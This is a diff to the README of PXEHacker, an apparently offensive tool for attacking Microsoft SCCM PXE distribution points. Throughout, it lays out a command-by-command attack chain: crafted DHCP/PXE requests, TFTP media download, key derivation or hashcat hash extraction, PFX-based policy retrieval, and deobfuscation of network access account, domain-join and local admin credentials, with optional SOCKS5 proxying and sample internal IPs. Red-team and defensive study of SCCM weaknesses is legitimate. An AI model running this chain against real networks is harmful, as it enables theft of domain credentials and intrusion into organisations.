@@ -19,49 +19,61 @@ Merges the best of [PXEThief](https://github.com/MWR-CyberSec/PXEThief) (MWR Cyb
 ## Installation
 
 ```bash
-pip install -r requirements.txt
+cd ~/share/dev/PXEHacker
+uv venv --clear
+uv pip install -r requirements.txt
+source .venv/bin/activate
 ```
 
-Requirements: Python 3.8+, Linux (primary platform).
+Requirements: Python 3.8+, Linux (primary platform), `uv`.
 
 ## Quick Start
 
-### Full attack chain (with SOCKS5 proxy)
+### Most Common Workflow
+
+If you already know the PXE Distribution Point IP, skip `discover`. `discover` uses DHCP broadcast and only works from the same broadcast domain.
 
 ```bash
-# 1. Discover PXE servers on the network (requires root)
-sudo python3 pxehacker.py discover
+# 1. Identify the source IP the target will see
+ip route get <target_ip>
 
-# 2. Attack the PXE server through SOCKS5 proxy
-python3 pxehacker.py attack <target_ip> <your_ip> <socks_host> <socks_port> -o ./loot
+# 2. Pull the PXE media, derive/decrypt the media key, and extract variables.xml + PFX
+.venv/bin/python pxehacker.py attack <target_ip> <src_ip> -o ./loot
 
-# 3. Retrieve policies using extracted PFX certificate
-python3 pxehacker.py policies ./loot/variables.xml -o ./loot
-
-# 4. Done — check ./loot/ for extracted credentials
+# 3. Retrieve policies and extract credentials
+# Use --mp if the management point hostname in variables.xml does not resolve on your box
+.venv/bin/python pxehacker.py policies ./loot/variables.xml -o ./loot --mp http://<target_ip>
 ```
 
-### Full attack chain (direct, no proxy)
+### PXEThief Mode 2 Equivalent
+
+PXEHacker splits PXEThief mode `2` into two explicit commands:
 
 ```bash
-# 1. Discover PXE servers
-sudo python3 pxehacker.py discover
+.venv/bin/python pxehacker.py attack 10.112.0.142 10.111.0.111 -o ./loot
+.venv/bin/python pxehacker.py policies ./loot/variables.xml -o ./loot --mp http://10.112.0.142
+```
 
-# 2. Attack directly (omit SOCKS args)
-python3 pxehacker.py attack <target_ip> <your_ip> -o ./loot
+Notes:
+- `attack` covers the PXE request, TFTP download, blank-password key derivation, and `variables.xml` / PFX extraction.
+- `policies` uses the extracted PFX to retrieve NAA, task sequence, and collection policy data.
+- PXEHacker prints the BCD path but does not download the `.boot.bcd`, because it is not needed for the credential path.
 
-# 3. Retrieve policies
-python3 pxehacker.py policies ./loot/variables.xml -o ./loot
+### Through SOCKS5
+
+```bash
+.venv/bin/python pxehacker.py attack <target_ip> <src_ip> <socks_host> <socks_port> -o ./loot
+.venv/bin/python pxehacker.py policies ./loot/variables.xml -o ./loot --mp http://<target_ip>
 ```
 
 ## Subcommands
 
 ### `discover` — Find PXE servers
 
-Sends a DHCP broadcast to discover PXE-enabled SCCM Distribution Points. Requires root for raw socket access.
+Sends a DHCP broadcast to discover PXE-enabled SCCM Distribution Points. Requires root for raw socket access and only works from the same broadcast domain.
 
 ```bash
-sudo python3 pxehacker.py discover [-i INTERFACE] [-t TIMEOUT]
+sudo "$(pwd)/.venv/bin/python" pxehacker.py discover [-i INTERFACE] [-t TIMEOUT]
 ```
 
 | Flag | Description |
@@ -74,7 +86,7 @@ sudo python3 pxehacker.py discover [-i INTERFACE] [-t TIMEOUT]
 Sends a crafted DHCP/PXE request to the target DP, downloads the encrypted media variables file via TFTP, and attempts decryption.
 
 ```bash
-python3 pxehacker.py attack <target> <src_ip> [socks_host socks_port] [-p PASSWORD] [-o OUTPUT]
+.venv/bin/python pxehacker.py attack <target> <src_ip> [socks_host socks_port] [-p PASSWORD] [-o OUTPUT]
 ```
 
 | Argument | Description |
@@ -90,13 +102,14 @@ python3 pxehacker.py attack <target> <src_ip> [socks_host socks_port] [-p PASSWO
 - If **no PXE password** is set: the tool derives the decryption key automatically from the DHCP response and decrypts the media file.
 - If a **PXE password is set**: the tool outputs a hashcat-compatible hash for offline cracking. Re-run with `-p <cracked_hex>` after cracking.
 - On success, writes `variables.xml`, PFX certificate, and `loot_summary.txt` to the output directory.
+- The tool prints the BCD file path, but does not download the `.boot.bcd`.
 
 ### `decrypt` — Offline media decryption
 
 Decrypt a previously downloaded `.boot.var` / `variables.dat` file with a known key.
 
 ```bash
-python3 pxehacker.py decrypt <file> <key_hex> [-o OUTPUT]
+.venv/bin/python pxehacker.py decrypt <file> <key_hex> [-o OUTPUT]
 ```
 
 ### `hash` — Extract hashcat hash
@@ -104,7 +117,7 @@ python3 pxehacker.py decrypt <file> <key_hex> [-o OUTPUT]
 Extract a crackable hash from a password-protected media file.
 
 ```bash
-python3 pxehacker.py hash <file>
+.venv/bin/python pxehacker.py hash <file>
 ```
 
 Output format: `$sccm$aes128$<header_hex>` or `$sccm$aes256$<header_hex>`
@@ -116,7 +129,7 @@ For AES-256 cracking, see: https://github.com/chryzsh/hashcat-6.2.6-SCCM
 Uses the PFX certificate from decrypted media to authenticate to the SCCM Management Point and download encrypted policies.
 
 ```bash
-python3 pxehacker.py policies <variables.xml> [-o OUTPUT] [--mp URL] [--fallback-local]
+.venv/bin/python pxehacker.py policies <variables.xml> [-o OUTPUT] [--mp URL] [--fallback-local]
 ```
 
 | Flag | Description |
@@ -130,12 +143,14 @@ python3 pxehacker.py policies <variables.xml> [-o OUTPUT] [--mp URL] [--fallback
 - **Task Sequence** credentials (domain join, local admin, capture accounts)
 - **Collection Variables** (often contain obfuscated secrets)
 
+Use `--mp http://<dp_ip>` when the management point hostname in `variables.xml` does not resolve from your current host.
+
 ### `policies-local` — Offline policy decryption
 
 Decrypt previously downloaded `.raw` policy blobs without network access.
 
 ```bash
-python3 pxehacker.py policies-local <variables.xml> [-i INPUT_DIR] [-o OUTPUT]
+.venv/bin/python pxehacker.py policies-local <variables.xml> [-i INPUT_DIR] [-o OUTPUT]
 ```
 
 Expected files in input directory:
@@ -148,7 +163,7 @@ Expected files in input directory:
 Extract PFX certificates and variables from already-decrypted media XML.
 
 ```bash
-python3 pxehacker.py loot <variables.xml> [-o OUTPUT]
+.venv/bin/python pxehacker.py loot <variables.xml> [-o OUTPUT]
 ```
 
 ### `deobfuscate` — Credential deobfuscation
@@ -157,10 +172,10 @@ Deobfuscate SCCM `secret="1"` credential strings. Accepts either an XML file or 
 
 ```bash
 # From NAAConfig XML file
-python3 pxehacker.py deobfuscate NAAConfig.xml
+.venv/bin/python pxehacker.py deobfuscate NAAConfig.xml
 
 # From raw hex credential string
-python3 pxehacker.py deobfuscate "8913..."
+.venv/bin/python pxehacker.py deobfuscate "8913..."
 ```
 
 Supports: CALG_3DES (0x6603), CALG_AES_128 (0x660E), CALG_AES_192 (0x660F), CALG_AES_256 (0x6610).
@@ -246,8 +261,8 @@ The SOCKS5 client establishes a TCP connection for the control channel, then use
 - Same CryptDeriveKey key derivation with algorithm-specific key lengths
 
 **CMS/PKCS7 Policy Decryption:**
-- RSA-PKCS1v15 decryption of content encryption key
-- 3DES-CBC content decryption
+- Supports RSAES-OAEP and RSA PKCS#1 v1.5 key transport
+- Supports 3DES-CBC and AES-128/192/256-CBC content encryption
 - Custom ASN1 DER parser (handles SCCM's SubjectKeyIdentifier which OpenSSL struggles with)
 
 ## Output Files
